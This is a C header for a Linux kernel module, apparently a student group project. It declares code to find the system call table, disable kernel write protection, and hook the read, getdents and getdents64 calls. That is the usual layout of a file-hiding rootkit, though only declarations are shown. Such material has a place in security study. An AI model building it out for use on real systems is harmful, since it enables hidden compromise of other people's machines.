#ifndef _GROUP7_HOOK_H
#define _GROUP7_HOOK_H

#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/syscalls.h>

extern void **sys_calls;

typedef struct {
    bool active;
    void *hook;
    void *orig;
} sc_hook_t;

extern atomic_t read_count;
extern atomic_t getdents_count;
extern atomic_t getdents64_count;

extern asmlinkage ssize_t (*sys_read)(const struct pt_regs *);
extern asmlinkage long (*sys_getdents)(const struct pt_regs *);
extern asmlinkage long (*sys_getdents64)(const struct pt_regs *);

int retrieve_sys_call_table(void);
void init_hooks(void);
void remove_hooks(void);

void disable_protection(void);
void enable_protection(void);

// hooks
asmlinkage ssize_t g7_read(const struct pt_regs *);
asmlinkage long g7_getdents(const struct pt_regs *);
asmlinkage long g7_getdents64(const struct pt_regs *);

#endif//_GROUP7_HOOK_H
